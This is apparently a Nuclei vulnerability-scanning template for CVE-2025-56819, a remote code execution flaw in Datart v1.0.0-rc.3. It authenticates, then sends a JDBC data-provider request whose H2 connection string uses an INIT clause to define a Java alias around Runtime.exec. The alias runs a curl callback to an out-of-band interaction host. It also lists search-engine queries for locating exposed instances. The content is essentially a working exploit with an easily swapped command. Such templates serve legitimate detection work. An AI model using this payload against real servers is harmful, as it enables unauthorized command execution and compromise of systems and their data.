flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    kval:
    - authorization
    name: token
    part: header
    type: kval
  matchers:
  - dsl:
    - contains_all(body, "email\":", "data\":{")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /api/v1/users/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"username":"{{username}}","password":"{{password}}"}

    '
- extractors:
  - internal: true
    json:
    - .message
    name: message
    part: body
    type: json
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - "POST /api/v1/data-provider/test HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    Authorization: {{token}}\n\n{\n  \"name\": \"jdbc-data-provider\",\n  \"type\"\
    : \"JDBC\",\n  \"properties\": {\n    \"dbType\": \"H2\",\n    \"url\": \"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE\
    \ ALIAS {{rand_alias}} AS 'void cmd_exec(String cmd) throws java.lang.Exception\
    \ {Runtime.getRuntime().exec(cmd)\\\\;}'\\\\;CALL {{rand_alias}} ('curl {{interactsh-url}}')\\\
    \\;\",\n    \"user\": null,\n    \"password\": \"\",\n    \"driverClass\": \"\
    org.h2.Driver\",\n    \"serverAggregate\": false,\n    \"enableSpecialSQL\": false,\n\
    \    \"enableSyncSchemas\": true,\n    \"syncInterval\": \"60\",\n    \"properties\"\
    : {}\n  }\n}\n"
id: CVE-2025-56819
info:
  author: Redmomn
  classification:
    cpe: cpe:2.3:a:running-elephant:datart:1.0.0:rc3:*:*:*:*:*:*
    cve-id: CVE-2025-56819
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.9527
    epss-score: 0.1996
  description: 'Datart v1.0.0-rc.3 contains a vulnerability that allows remote attackers
    to execute arbitrary code via INIT connection parameters.

    '
  metadata:
    fofa-query: title="Datart"
    hunter-query: web.title="Datart"
    max-request: 3
    product: datart
    shodan-query: title:"Datart"
    vendor: datart
    verified: true
  name: Datart v1.0.0-rc.3 - Remote Code Execution
  reference:
  - https://github.com/advisories/GHSA-623q-jr4p-f87c
  - https://github.com/xyyzxc/CVE-2025-56819
  - https://nvd.nist.gov/vuln/detail/CVE-2025-56819
  severity: critical
  tags: cve,cve2025,datart,rce,h2,jdbc,oast,authentication
variables:
  rand_alias: '{{rand_text_alpha(8)}}'
